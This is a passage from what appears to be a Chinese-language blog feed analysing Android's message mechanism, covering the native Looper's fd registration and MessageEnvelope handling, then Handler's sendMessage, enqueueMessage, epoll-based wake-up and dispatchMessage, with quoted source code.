<p>在上面的代码与处理<code>response</code>的代码中间夹着的是处理<code>MessageEnvelope</code>的代码，我们后面再讲这段，现在到处理<code>response</code>的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; mResponses.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    Response&amp; response = mResponses.editItemAt(i);</span><br><span class="line">    <span class="keyword">if</span> (response.request.ident == POLL_CALLBACK) &#123;</span><br><span class="line">        <span class="keyword">int</span> fd = response.request.fd;</span><br><span class="line">        <span class="keyword">int</span> events = response.events;</span><br><span class="line">        <span class="keyword">void</span>* data = response.request.data;</span><br><span class="line">        <span class="keyword">int</span> callbackResult = response.request.callback-&gt;handleEvent(fd, events, data);</span><br><span class="line">        <span class="keyword">if</span> (callbackResult == <span class="number">0</span>) &#123;</span><br><span class="line">            removeFd(fd, response.request.seq);</span><br><span class="line">        &#125;</span><br><span class="line">        response.request.callback.<span class="built_in">clear</span>();</span><br><span class="line">        result = POLL_CALLBACK;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>遍历所有<code>response</code>对象，取出之前注册的<code>request</code>对象的信息，然后调用了<code>request.callback-&gt;handleEvent()</code>方法进行回调，如果该回调返回0，则调用<code>removeFd()</code>方法取消这个<code>fd</code>的注册。</p>
<p>再梳理一遍这个过程：注册的自定义<code>fd</code>被消息唤醒，从<code>mRequests</code>中以<code>fd</code>为<code>key</code>找到对应的注册好的<code>request</code>对象然后生成<code>response</code>对象，在<code>MessageEnvelop</code>处理完毕之后处理<code>response</code>，调用<code>request</code>中的<code>callback</code>的<code>handleEvent()</code>方法。</p>
<p>那么<code>addFd()</code>注册自定义<code>fd</code>与<code>removeFd()</code>取消注册是如何实现的呢？</p>
<h4 id="addFd"><a href="#addFd" class="headerlink" title="addFd()"></a>addFd()</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Looper::addFd</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> ident, <span class="keyword">int</span> events, <span class="keyword">const</span> sp&lt;LooperCallback&gt;&amp; callback, <span class="keyword">void</span>* data)</span> </span>&#123;</span><br><span class="line">	...</span><br><span class="line">    &#123; <span class="comment">// acquire lock</span></span><br><span class="line">        AutoMutex _l(mLock);</span><br><span class="line"></span><br><span class="line">        Request request;</span><br><span class="line">        request.fd = fd;</span><br><span class="line">        request.ident = ident;</span><br><span class="line">        request.events = events;</span><br><span class="line">        request.seq = mNextRequestSeq++;</span><br><span class="line">        request.callback = callback;</span><br><span class="line">        request.data = data;</span><br><span class="line">        <span class="keyword">if</span> (mNextRequestSeq == <span class="number">-1</span>) mNextRequestSeq = <span class="number">0</span>; <span class="comment">// reserve sequence number -1</span></span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">eventItem</span>;</span></span><br><span class="line">        request.initEventItem(&amp;eventItem);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">ssize_t</span> requestIndex = mRequests.indexOfKey(fd);</span><br><span class="line">        <span class="keyword">if</span> (requestIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem);</span><br><span class="line">            <span class="keyword">if</span> (epollResult &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ALOGE(<span class="string">"Error adding epoll events for fd %d: %s"</span>, fd, strerror(errno));</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mRequests.add(fd, request);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_MOD, fd, &amp; eventItem);</span><br><span class="line">            <span class="keyword">if</span> (epollResult &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (errno == ENOENT) &#123;</span><br><span class="line">                    epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem);</span><br><span class="line">                    <span class="keyword">if</span> (epollResult &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        ALOGE(<span class="string">"Error modifying or adding epoll events for fd %d: %s"</span>,</span><br><span class="line">                                fd, strerror(errno));</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    scheduleEpollRebuildLocked();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ALOGE(<span class="string">"Error modifying epoll events for fd %d: %s"</span>, fd, strerror(errno));</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            mRequests.replaceValueAt(requestIndex, request);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">// release lock</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第6-13行使用传入的参数初始化了<code>request</code>对象，然后16行由<code>request</code>来初始化注册<code>epoll</code>使用的<code>event</code>。19行根据<code>mRequests.indexOfKey()</code>方法取出的值来判断<code>fd</code>是否已经注册，如果未注册，则在20行进行系统调用<code>epoll_ctl()</code>注册新监听并在25行将<code>fd</code>与<code>request</code>存入<code>mRequest</code>，如果已注册，则在27行更新注册并在42行更新<code>request</code>。</p>
<p>这就是自定义<code>fd</code>设置的过程：保存<code>request</code>并使用<code>epoll_ctl</code>系统调用注册<code>fd</code>的监听。</p>
<h4 id="removeFd"><a href="#removeFd" class="headerlink" title="removeFd()"></a>removeFd()</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Looper::removeFd</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> seq)</span> </span>&#123;</span><br><span class="line">    &#123; <span class="comment">// acquire lock</span></span><br><span class="line">        AutoMutex _l(mLock);</span><br><span class="line">        <span class="keyword">ssize_t</span> requestIndex = mRequests.indexOfKey(fd);</span><br><span class="line">        <span class="keyword">if</span> (requestIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (seq != <span class="number">-1</span> &amp;&amp; mRequests.valueAt(requestIndex).seq != seq) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mRequests.removeItemsAt(requestIndex);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_DEL, fd, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (epollResult &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (seq != <span class="number">-1</span> &amp;&amp; (errno == EBADF || errno == ENOENT)) &#123;</span><br><span class="line">                scheduleEpollRebuildLocked();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ALOGE(<span class="string">"Error removing epoll events for fd %d: %s"</span>, fd, strerror(errno));</span><br><span class="line">                scheduleEpollRebuildLocked();</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">// release lock</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解除的过程相反，在第11行删除<code>mRequests</code>中的键值对，然后在第13行系统调用<code>epoll_ctl()</code>解除<code>fd</code>的<code>epoll</code>注册。</p>
<h3 id="MessageEnvelop消息处理"><a href="#MessageEnvelop消息处理" class="headerlink" title="MessageEnvelop消息处理"></a>MessageEnvelop消息处理</h3><p>之前说到，在<code>request</code>生成<code>response</code>到<code>response</code>的处理中间有一段代码执行了<code>MessageEnvelop</code>消息的处理，这个顺序保证了<code>MessageEnvelop</code>优先于<code>fd</code>引起的<code>request</code>的处理。</p>
<p>现在我们来看这段代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mNextMessageUptime = LLONG_MAX;</span><br><span class="line"><span class="keyword">while</span> (mMessageEnvelopes.<span class="built_in">size</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">nsecs_t</span> now = systemTime(SYSTEM_TIME_MONOTONIC);</span><br><span class="line">    <span class="keyword">const</span> MessageEnvelope&amp; messageEnvelope = mMessageEnvelopes.itemAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (messageEnvelope.uptime &lt;= now) &#123;</span><br><span class="line">        &#123; <span class="comment">// obtain handler</span></span><br><span class="line">            sp&lt;MessageHandler&gt; handler = messageEnvelope.handler;</span><br><span class="line">            Message message = messageEnvelope.message;</span><br><span class="line">            mMessageEnvelopes.removeAt(<span class="number">0</span>);</span><br><span class="line">            mSendingMessage = <span class="literal">true</span>;</span><br><span class="line">            mLock.unlock();</span><br><span class="line">            handler-&gt;handleMessage(message);</span><br><span class="line">        &#125; <span class="comment">// release handler</span></span><br><span class="line"></span><br><span class="line">        mLock.lock();</span><br><span class="line">        mSendingMessage = <span class="literal">false</span>;</span><br><span class="line">        result = POLL_CALLBACK;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mNextMessageUptime = messageEnvelope.uptime;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>mMessageEnvelopes</code>容器中存储了所有的消息，第4行从首位置取出一条消息，随后进行时间判断，如果时间到达，先移出容器，与<code>java</code>层比较相似都是调用了<code>handler</code>的<code>handleMessage()</code>来进行消息的处理。</p>
<p>那么<code>MessageEnvelope</code>是如何添加的呢？</p>
<p><code>Native Looper</code>提供了一套与<code>java</code>层<code>MessageQueue</code>类似的方法，用于添加<code>MessageEnvelope</code>：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Looper::sendMessageAtTime</span><span class="params">(<span class="keyword">nsecs_t</span> uptime, <span class="keyword">const</span> sp&lt;MessageHandler&gt;&amp; handler,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> Message&amp; message)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    &#123; <span class="comment">// acquire lock</span></span><br><span class="line">        AutoMutex _l(mLock);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> messageCount = mMessageEnvelopes.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span> (i &lt; messageCount &amp;&amp; uptime &gt;= mMessageEnvelopes.itemAt(i).uptime) &#123;</span><br><span class="line">            i += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function">MessageEnvelope <span class="title">messageEnvelope</span><span class="params">(uptime, handler, message)</span></span>;</span><br><span class="line">        mMessageEnvelopes.insertAt(messageEnvelope, i, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mSendingMessage) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">// release lock</span></span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">        wake();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段添加<code>MessageEnvelope</code>的代码不需要太多的解释。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>现在我们看到，其实<code>Native</code>中的消息机制有两个方面，一方面是通过<code>addFd()</code>注册的自定义<code>fd</code>触发消息处理，通过<code>mRequests</code>保存的<code>request</code>对象中的<code>callback</code>进行消息处理。另一方面是通过与<code>java</code>层类似的<code>MessageEnvelop</code>消息对象进行处理，调用的是该对象<code>handler</code>域的<code>handleMessage()</code>方法，与<code>java</code>层非常类似。优先级是先处理<code>MessageEnvelop</code>再处理<code>request</code>。</p>
<h2 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h2><p>现在消息机制全部内容分析下来，我们可以看到<code>android</code>的消息机制不算复杂，分为<code>native</code>与<code>java</code>两个部分，这两个部分分别有自己的消息处理机制，其中关键的超时与唤醒部分是借助了<code>linux</code>系统<code>epoll</code>机制来实现的。</p>
<p>连接<code>java</code>与<code>native</code>层消息处理过程的是<code>next()</code>方法中的<code>nativePollOnce()</code>，<code>java</code>层消息循环先调用它，自身阻塞，进入<code>native</code>的消息处理，在<code>native</code>消息处理完毕后返回，再进行<code>java</code>层的消息处理，正是因为如此，如果我们在处理<code>java</code>层消息的时候执行了耗时或阻塞的任务（甚至阻塞了整个主线程），整个<code>java</code>层的消息循环就会阻塞，也无法进入<code>native</code>层的消息处理，也就无法响应例如触摸事件这样的消息，导致ANR的发生。这也就是我们不应在主线程中执行这类任务的原因。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>Event</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Event</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 消息机制（二）Handler对消息机制的使用</title>
    <url>/2017/10/24/android_event_2/</url>
    <content><![CDATA[<p><a href="http://www.viseator.com/2017/10/22/android_event_1/">Android 消息机制（一）消息队列的创建与循环的开始 Looper与MessageQueue</a>中讲述了消息机制的底层实现，下面就从平时所常用的<code>Handler</code>来讲述消息机制的使用。</p>
<h2 id="Handler"><a href="#Handler" class="headerlink" title="Handler"></a>Handler</h2><p><code>Handler</code>是我们平时进行异步、多线程开发中常用的一个组件，如果在应用主线程中调用阻塞的或者资源消耗量大的任务，会造成UI的更新卡顿，所以我们会将这样的任务放在新的线程中进行操作。当需要通知UI进行更新时，我们会使用<code>Handler</code>创建消息丢入主线程的消息队列，再等待主线程的<code>Handler</code>的处理方法随着消息的处理而被调用，再进行下面的操作。这是<code>Handler</code>的基本用法，它的实现就与消息机制密切相关。</p>
<p>下面我们就对它的实现进行分析。</p>
<a id="more"></a>
<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p><code>Handler</code>的构造方法中除了实现默认参数的相互调用外，有内容的有这么两个：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Handler</span><span class="params">(Callback callback, <span class="keyword">boolean</span> async)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    mLooper = Looper.myLooper();</span><br><span class="line">    <span class="keyword">if</span> (mLooper == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(</span><br><span class="line">            <span class="string">"Can't create handler inside thread that has not called Looper.prepare()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mQueue = mLooper.mQueue;</span><br><span class="line">    mCallback = callback;</span><br><span class="line">    mAsynchronous = async;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果传入的了<code>callback</code>，将会保存到<code>mCallback</code>域中，之后的消息处理中会看到。</p>
<p>如果没有传入<code>loop</code>参数，将会使用默认的<code>Looper.myLooper()</code>也就是之前提到过的本线程<code>TLS</code>中储存的<code>Looper</code>对象。<code>mQueue</code>消息队列就是从该<code>Looper</code>中获取的消息队列。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Handler</span><span class="params">(Looper looper, Callback callback, <span class="keyword">boolean</span> async)</span> </span>&#123;</span><br><span class="line">    mLooper = looper;</span><br><span class="line">    mQueue = looper.mQueue;</span><br><span class="line">    mCallback = callback;</span><br><span class="line">    mAsynchronous = async;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果传入了<code>looper</code>，那么我们将从它这里获取对应的消息队列对象，之后的消息就会放入这个队列中，这也是我们可以通过<code>Handler</code>实现跨线程通信的基础。</p>
<h3 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h3><h4 id="sendMessage调用链"><a href="#sendMessage调用链" class="headerlink" title="sendMessage调用链"></a>sendMessage调用链</h4><p>那么我们直接进入主题：使用<code>Handler</code>来发送异步处理的消息。</p>
<p>发送消息，我们最常用的是<code>sendMessage()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">sendMessage</span><span class="params">(Message msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sendMessageDelayed(msg, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">sendMessageDelayed</span><span class="params">(Message msg, <span class="keyword">long</span> delayMillis)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (delayMillis &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        delayMillis = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sendMessageAtTime(msg, SystemClock.uptimeMillis() + delayMillis);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">sendMessageAtTime</span><span class="params">(Message msg, <span class="keyword">long</span> uptimeMillis)</span> </span>&#123;</span><br><span class="line">    MessageQueue queue = mQueue;</span><br><span class="line">    <span class="keyword">if</span> (queue == <span class="keyword">null</span>) &#123;</span><br><span class="line">        RuntimeException e = <span class="keyword">new</span> RuntimeException(</span><br><span class="line">                <span class="keyword">this</span> + <span class="string">" sendMessageAtTime() called with no mQueue"</span>);</span><br><span class="line">        Log.w(<span class="string">"Looper"</span>, e.getMessage(), e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> enqueueMessage(queue, msg, uptimeMillis);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终调用的是<code>sendMessageAtTime()</code>方法，发送在特定时刻处理的消息。</p>
<p>然后调用<code>enqueueMessage()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">enqueueMessage</span><span class="params">(MessageQueue queue, Message msg, <span class="keyword">long</span> uptimeMillis)</span> </span>&#123;</span><br><span class="line">    msg.target = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (mAsynchronous) &#123;</span><br><span class="line">        msg.setAsynchronous(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> queue.enqueueMessage(msg, uptimeMillis);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的第2行中，将<code>msg</code>的<code>target</code>设置为<code>this</code>也就是这个<code>Handler</code>本身，我们回想起消息循环中处理<code>Message</code>的调用：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msg.target.dispatchMessage(msg);</span><br></pre></td></tr></table></figure><br>现在我们知道，<code>Handler</code>发送的消息被消息队列拿到后，会调用发送它的<code>Handler</code>的<code>dispatchMessage()</code>方法对它进行处理。</p>
<p>然后，调用了<code>MessageQueue</code>的<code>enqueueMessage()</code>方法来向消息队列中插入消息：</p>
<h4 id="enqueueMessage"><a href="#enqueueMessage" class="headerlink" title="enqueueMessage"></a>enqueueMessage</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">enqueueMessage</span><span class="params">(Message msg, <span class="keyword">long</span> when)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 不允许没有target的Message，这种Message(barrier)只能由系统产生用于唤醒消息队列</span></span><br><span class="line">    <span class="keyword">if</span> (msg.target == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Message must have a target."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 防止消息被重复处理</span></span><br><span class="line">    <span class="keyword">if</span> (msg.isInUse()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(msg + <span class="string">" This message is already in use."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查消息队列是否处于退出状态</span></span><br><span class="line">        <span class="keyword">if</span> (mQuitting) &#123;</span><br><span class="line">            IllegalStateException e = <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">                    msg.target + <span class="string">" sending message to a Handler on a dead thread"</span>);</span><br><span class="line">            Log.w(TAG, e.getMessage(), e);</span><br><span class="line">            msg.recycle();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        msg.markInUse();</span><br><span class="line">        msg.when = when;</span><br><span class="line">        Message p = mMessages;</span><br><span class="line">        <span class="keyword">boolean</span> needWake;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="keyword">null</span> || when == <span class="number">0</span> || when &lt; p.when) &#123;</span><br><span class="line">            <span class="comment">// 在这三种情况下，这条消息被插入到了队列的头部，因此我们应唤醒消息队列</span></span><br><span class="line">            msg.next = p;</span><br><span class="line">            mMessages = msg;</span><br><span class="line">            needWake = mBlocked; <span class="comment">// 如果处于阻塞状态，则需要进行唤醒</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 在队列中插入的消息，只有在target为空（barrier）并且设置为异步时，需要进行唤醒操作</span></span><br><span class="line">            needWake = mBlocked &amp;&amp; p.target == <span class="keyword">null</span> &amp;&amp; msg.isAsynchronous();</span><br><span class="line">            Message prev;</span><br><span class="line">            <span class="comment">// 熟悉的链表插入操作</span></span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                prev = p;</span><br><span class="line">                p = p.next;</span><br><span class="line">                <span class="keyword">if</span> (p == <span class="keyword">null</span> || when &lt; p.when) &#123;</span><br><span class="line">                    <span class="keyword">break</span>；</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (needWake &amp;&amp; p.isAsynchronous()) &#123;</span><br><span class="line">                    needWake = <span class="keyword">false</span>; <span class="comment">// 如果有消息不需要进行异步处理，则无需进行唤醒操作</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 插入到p结节之前</span></span><br><span class="line">            msg.next = p; </span><br><span class="line">            prev.next = msg;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果有needWake标记，则进行消息队列的唤醒操作</span></span><br><span class="line">        <span class="keyword">if</span> (needWake) &#123;</span><br><span class="line">            nativeWake(mPtr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整个方法的流程在注释中进行了分析，这里主要就分为了两种情况，需要进行队列唤醒与无需进行队列唤醒的，如果需要队列唤醒操作（有<code>needWake</code>标记），则会在调用的最后调用<code>nativeWake()</code>方法进行<code>native</code>的唤醒操作。</p>
<h4 id="队列的唤醒"><a href="#队列的唤醒" class="headerlink" title="队列的唤醒"></a>队列的唤醒</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_MessageQueue_nativeWake</span><span class="params">(JNIEnv* env, jclass clazz, jlong ptr)</span> </span>&#123;</span><br><span class="line">    NativeMessageQueue* nativeMessageQueue = <span class="keyword">reinterpret_cast</span>&lt;NativeMessageQueue*&gt;(ptr);</span><br><span class="line">    nativeMessageQueue-&gt;wake();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>native</code>方法中，利用<code>mPtr</code>指针找到<code>native</code>层创建的<code>NativeMessageQueue</code>对象，然后调用了它的<code>wake()</code>方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NativeMessageQueue::wake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    mLooper-&gt;wake();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而接着调用的是<code>NativeMessageQueue</code>对象的中保存的<code>Native Looper</code>对象的<code>wake()</code>方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Looper::wake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> inc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">ssize_t</span> nWrite = TEMP_FAILURE_RETRY(<span class="built_in">write</span>(mWakeEventFd, &amp;inc, <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)));</span><br><span class="line">    <span class="keyword">if</span> (nWrite != <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (errno != EAGAIN) &#123;</span><br><span class="line">            LOG_ALWAYS_FATAL(<span class="string">"Could not write wake signal to fd %d: %s"</span>,</span><br><span class="line">                    mWakeEventFd, strerror(errno));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方法做的事情非常简单，利用<code>write()</code>函数，向<code>mWakeEventFd</code>这个<code>fd</code>中写入了<code>inc</code>这个值（1）。</p>
<p>为什么只需要这样简单的写入就可以做到唤醒消息队列呢？</p>
<p>我们再回想到上一篇文章中的<code>Native Looper</code>创建与<code>Epoll</code>的初始化过程，我们创建了这个<code>eventFd</code>类型的<code>mWakeEventFd</code>，并且为它注册了<code>epoll</code>监听，一旦有来自于<code>mWakeEventFd</code>的新内容，<code>NativePollOnce()</code>中的<code>epoll_wait()</code>调用就会返回，这里就已经起到了唤醒队列的作用。</p>
<p>到这里，发送（插入）新消息到消息队列的过程已经完成，我们只需要等待设置的时间到达，消息队列就会取出我们发送的消息并进行处理。</p>
<h3 id="消息的处理"><a href="#消息的处理" class="headerlink" title="消息的处理"></a>消息的处理</h3><p>消息队列拿到消息后，调用<code>msg.target.dispatchMessage(msg);</code>进行消息的处理，从前文我们了解到，<code>Handler</code>发送的消息的<code>target</code>就是<code>Handler</code>自身，所以调用的就是它的<code>dispatchMessage()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dispatchMessage</span><span class="params">(Message msg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.callback != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handleCallback(msg);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mCallback != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mCallback.handleMessage(msg)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        handleMessage(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个过程也比较经典，第2行<code>if</code>判断<code>Message</code>是否拥有自己的<code>callback</code>，如果有的话就调用<code>handleCallback()</code>来运行这个<code>Runnable</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handleCallback</span><span class="params">(Message message)</span> </span>&#123;</span><br><span class="line">    message.callback.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果没有自带<code>callback</code>，第5行检查<code>Handler</code>是否自带<code>callback</code>，如果有的话就去执行这个<code>callback</code>，但是这里还有一点细节需要注意，如果这个方法返回了<code>false</code>，那么后面<code>Handler</code>自带的<code>handlerMessage()</code>方法同样会被执行，这里其实就是一个执行的优先级顺序的问题，一般情况下我们使用时只会传入<code>callback</code>或是重写<code>Handler</code>的<code>handleMessage()</code>方法，优先级也就是确保一个执行顺序的逻辑。</p>
<hr>
<p>到这里，<code>Handler</code>的部分就结束了，但是整个消息机制的分析还没有结束，到现在我们分析的都是<code>java</code>层对消息的处理过程，略过了<code>native</code>层自己的一套处理来自于<code>native</code>的消息的机制，下面一篇文章就会把关注点放在这一部分。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>Event</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Event</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 消息机制（一）消息队列的创建与循环的开始 Looper与MessageQueue</title>
    <url>/2017/10/22/android_event_1/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>  <strong>本文基于<code>Android 7.1.1 (API 25)</code>的源码分析编写</strong> </p>
